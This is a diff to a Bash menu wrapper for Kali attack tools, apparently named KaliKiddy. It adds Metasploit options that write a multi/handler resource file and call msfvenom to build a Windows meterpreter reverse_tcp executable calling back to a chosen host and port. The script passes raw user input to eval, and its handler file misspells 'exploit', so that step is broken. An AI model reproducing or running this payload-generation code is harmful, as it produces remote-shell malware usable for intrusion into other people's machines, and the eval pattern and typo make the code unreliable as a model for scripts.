@@ -12,9 +12,33 @@ NC='\e[0m'
 
 TITLE="KaliKiddy"
 
+function banner(){
+printf "${BLUE}..............\n"
+printf "            ..,;:ccc,.\n"
+printf "          ......''';lxO.\n"
+printf ".....''''..........,:ld;\n"
+printf "           .';;;:::;,,.x,\n"
+printf "      ..'''.            0Xxoc:,.  ...\n"
+printf "  ....                ,ONkc;,;cokOdc',.\n"
+printf " .                   OMo           ':${GREEN}dd${BLUE}o.\n"
+printf "                    dMc               :OO;\n"
+printf "                    0M.                 .:o.\n"
+printf "                    ;Wd\n"
+printf "                     ;XO,\n"
+printf "                       ,d0Odlc;,..\n"
+printf "                           ..',;:cdOOd::,.\n"
+printf "${PURPLE} _  __     _ _ _  ___     _     _   ${BLUE}.:d;.':;.\n"
+printf "${PURPLE}| |/ /__ _| (_) |/ (_) __| | __| |_   _${BLUE}'d,  .'\n"
+printf "${PURPLE}| ' // _\` | | | ' /| |/ _\` |/ _\` | | | |${BLUE};l   ..\n"
+printf "${PURPLE}| . \ (_| | | | . \| | (_| | (_| | |_| |  ${BLUE}.o\n"
+printf "${PURPLE}|_|\_\__,_|_|_|_|\_\_|\__,_|\__,_|\__, |    ${BLUE}c\n"
+printf "${PURPLE}                                  |___/     ${BLUE}.'\n"
+printf "${WHITE}PAKURI Version 6                             ${BLUE}. ${NC}\n"
+}
+
 function mainmenu(){
 	clear
-	figlet Kali Kiddy
+	figlet KaliKiddy
     menu_title=(" Kali-tools-top10" "" "")
     printf "${WHITE}"
     for ((i=0;i<3;i++))
@@ -91,7 +115,7 @@ function kalitoolstop10_menu2(){
     read -n 1 -s NUM
 	case $NUM in
 	1)
-		cmd_wifite
+		menu_metasploit
 		;;
 	2)
 		cmd_crackmapexec
@@ -216,11 +240,13 @@ function menu_hydra(){
     read -n 1 -s NUM
     case $NUM in
     1)
-            cmd_hydra1
-            ;;
+        cmd_hydra1
+        ;;
     2)
-            cmd_hydra2
-            ;;
+        cmd_hydra2
+        ;;
+    *)
+        ;;
 	esac
 }
 
@@ -331,6 +357,8 @@ function menu_john(){
 	4)
 		cmd_john4
 		;;
+    *)
+        ;;
     esac
 }
 
@@ -394,7 +422,7 @@ function cmd_john2(){
     cmd="john "
     printf "(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}Kali-tools-top10${NC} > ${BLUE}$cmd${NC}\n"
     printf "${BLUE}Options${NC}:\n"
-	echo "  --loopback[=FILE]          Like --wordlist, but extract words from a .pot file"
+	echo "  --loopback[=FILE]   Like --wordlist, but extract words from a .pot file"
     printf "${BLUE}usage${NC}: john ${WHITE}[OPTIONS] [PASSWORD-FILES]${NC}\n"
     printf "${RED}Example${NC}:  john --loopback <HASH_LIST_FILE>\n"
     read -e -p "Command? > $cmd" arg
@@ -483,9 +511,153 @@ function menu_metasploit(){
     printf "+---+\n"
     printf "${BLUE}%5s+---+\n"
     printf "%5s| 1 |%s\n" "" " metasploit-framework"
-    printf "%5s+---+\n${NC}"
+    printf "%5s+---+\n"
+    printf "${WHITE}%10s+---+\n"
+    printf "%10s| 1 |%s\n" "" " Normal Boot"
+    printf "%10s+---+%s\n"
+    printf "%10s+---+\n"
+    printf "%10s| 2 |%s\n" "" " Create Multi handler" 
+    printf "%10s+---+%s\n" "" " (windows/meterpreter/reverse_tcp)"
+    printf "%10s+---+\n"
+    printf "%10s| 3 |%s\n" "" " Create Payload"
+    printf "%10s+---+%s${NC}\n"
+	read -n 1 -s NUM
+    case $NUM in
+    1)
+        cmd_metasploit1
+        ;;
+    2)
+        cmd_metasploit2
+        ;;
+	3)
+		cmd_metasploit3
+		;;
+    *)
+        ;;
+    esac
 }
 
+function cmd_metasploit1(){
+	clear
+	figlet Metasploit
+    printf "${WHITE}+---+\n"
+    printf "| 1 |%s\n" " Kali-tools-top10"
+    printf "+---+\n"
+    printf "%5s+---+\n"
+    printf "%5s| 1 |%s\n" "" " metasploit-framework"
+    printf "%5s+---+\n"
+    printf "${BLUE}%10s+---+\n"
+    printf "%10s| 1 |%s\n" "" " Normal Boot"
+    printf "%10s+---+%s\n"
+    printf "${WHITE}%10s+---+\n"
+    printf "%10s| 2 |%s\n" "" " Create Multi handler" 
+    printf "%10s+---+%s\n" "" " (windows/meterpreter/reverse_tcp)"
+    printf "%10s+---+\n"
+    printf "%10s| 3 |%s\n" "" " Create Payload"
+    printf "%10s+---+%s${NC}\n" "" " (windows/meterpreter/reverse_tcp)"
+    cmd="msfconsole"
+    printf "(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}Kali-tools-top10${NC} > ${BLUE}metasploit-framework${NC}\n"
+    printf "${BLUE}Options${NC}:\n"
+    echo "-q, --quiet                      Do not print the banner on startup"
+    echo "-r, --resource FILE              Execute the specified resource file (- for stdin)"
+    echo "-h, --help                       Show this message    "
+    printf "${BLUE}usage${NC} :Usage: msfconsole ${WHITE}[options]${NC}"
+    read -e -p "Command? > $cmd" arg
+    if [ $arg = "-h" ] || [ $arg = "--help" ];then
+            arg="-h|more"
+    fi
+    cmd+=$arg
+    eval $cmd
+}
+
+function cmd_metasploit2(){
+	clear
+	figlet Metasploit
+    printf "${WHITE}+---+\n"
+    printf "| 1 |%s\n" " Kali-tools-top10"
+    printf "+---+\n"
+    printf "%5s+---+\n"
+    printf "%5s| 1 |%s\n" "" " metasploit-framework"
+    printf "%5s+---+\n"
+    printf "%10s+---+\n"
+    printf "%10s| 1 |%s\n" "" " Normal Boot"
+    printf "%10s+---+%s\n"
+    printf "${BLUE}%10s+---+\n"
+    printf "%10s| 2 |%s\n" "" " Create Multi Handler"
+    printf "%10s+---+%s\n" "" " (windows/meterpreter/reverse_tcp)"
+    printf "${WHITE}%10s+---+\n"
+    printf "%10s| 3 |%s\n" "" " Create Payload"
+    printf "%10s+---+%s${NC}\n" "" " (windows/meterpreter/reverse_tcp)"
+    cmd="msfconsole"
+    printf "(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}Kali-tools-top10${NC} > ${BLUE}metasploit-framework${NC}\n"
+    echo "Create handler..."
+    read -p "Local host <IP Address>: " LHOST
+    read -p "Local Port: " LPORT
+    cat <<EOF >> resouce.rc
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST $LHOST
+set LPORT $LPORT
+exsploit
+EOF
+    echo ""
+    echo "PAYLOAD: windows/meterpreter/reverse_tcp"
+    echo "LHOST  : $LHOST"
+    echo "LPORT  : $LPORT"
+    read -e -p "Ready? y|n> " ans
+    case $ans in
+    Y|y)
+        cmd+=" -r resouce.rc"
+        eval $cmd
+        ;;
+    n|N)
+        ;;
+    *)
+        ;;
+    esac
+    rm resouce.rc
+}
+
+function cmd_metasploit3(){
+	clear
+	figlet Metasploit
+    printf "${WHITE}+---+\n"
+    printf "| 1 |%s\n" " Kali-tools-top10"
+    printf "+---+\n"
+    printf "%5s+---+\n"
+    printf "%5s| 1 |%s\n" "" " metasploit-framework"
+    printf "%5s+---+\n"
+    printf "%10s+---+\n"
+    printf "%10s| 1 |%s\n" "" " Normal Boot"
+    printf "%10s+---+%s\n"
+    printf "%10s+---+\n"
+    printf "%10s| 2 |%s\n" "" " Create Multi Handler"
+    printf "%10s+---+%s\n" "" " (windows/meterpreter/reverse_tcp)"
+    printf "${BLUE}%10s+---+\n"
+    printf "%10s| 3 |%s\n" "" " Create Payload [Filetype:exe]"
+    printf "%10s+---+%s${NC}\n" "" " (windows/meterpreter/reverse_tcp)"
+    cmd="msfvenom"
+    printf "(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}Kali-tools-top10${NC} > ${BLUE}metasploit-framework${NC}\n"
+    echo "Create Payload..."
+    read -p "Local host <IP Address>: " LHOST
+    read -p "Local Port: " LPORT
+    echo ""
+    echo "PAYLOAD  : windows/meterpreter/reverse_tcp"
+    echo "LHOST    : $LHOST"
+    echo "LPORT    : $LPORT"
+    echo "Filetype : exe"
+    read -n 1 -p "Ready? y|n> " ans
+    case $ans in
+    Y|y)
+        cmd="$cmd -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -f exe > `pwd`/reverse_tcp.exe"
+        eval $cmd
+        ;;
+    n|N)
+        ;;
+    *)
+        ;;
+    esac
+}
 
 clear
 while :;do
